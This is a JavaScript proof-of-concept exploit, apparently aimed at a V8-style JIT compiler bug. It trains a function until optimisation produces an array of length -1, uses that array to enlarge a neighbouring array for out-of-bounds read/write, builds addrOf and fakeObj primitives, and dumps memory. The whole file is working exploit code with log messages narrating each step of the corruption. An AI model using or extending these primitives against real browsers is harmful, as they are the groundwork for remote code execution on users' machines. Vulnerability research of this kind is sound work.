function main() {
    var bs = new ArrayBuffer(8);
    var fs = new Float64Array(bs);
    var is = new BigUint64Array(bs);
    var us = new Uint32Array(bs);
    
    function log(_string) {
        console.log(_string)
    }
    
    function ftoi(val) {
        fs[0] = val;
        return is[0];
    }
    
    function myftoi(val) {
        fs[0] = val;
        return [us[0], us[1]];
    }
    
    function myitof(lower, upper) {
        us[0] = lower;
        us[1] = upper;
        return fs[0];
    }
    
    function itof(val) {
        is[0] = val;
        return fs[0];
    }
    
    function hex(_val) {
        return "0x"+_val.toString(16)
    }
    
    function foo(x) {
        let y = 0x7fffffff;
        if (x == NaN) y = NaN;
        if (x) y = -1;
        let z = y + 1;
        z >>= 31;
        z = Math.sign(z | 1);
        z = 0x7fffffff + 1 - z;
        let i = x ? 0 : z;
        i = 0 - Math.sign(i);
        let a = new Array(i);
        a.shift();
        let b = [1.1, 2.2, 3.3];
        return [a, b];
    }
    
    for (let i = 0; i < 100000; i++) foo(true);
    let [minus_1_arr, oob] = foo(false);
    log("[*] Created 2 arrays: 1 array of length -1 and 1 array of length 3")
    log("[*] The array of length 3 is the oob array which is not corrupted yet")
    log("[*] We will use the -1 length array to corrupt the oob array")
    function addrOf(k) {
        minus_1_arr[7] = k;
        return ftoi(oob[0]) & 0xffffffffn;
    }
    function fakeObj(k) {
        oob[0] = itof(k);
        return minus_1_arr[7];
    }
    minus_1_arr[13] = 100;
    log("[*] Increasing the length of the oob array to 100 get oob r/w")
    log(`[*] Sanity check: OOB array length: ${oob.length}`)
    
    for (let i = 0; i < 100; i++) {
        if (1===1) log(i + " - " + hex(ftoi(oob[i])));
    }
}

main()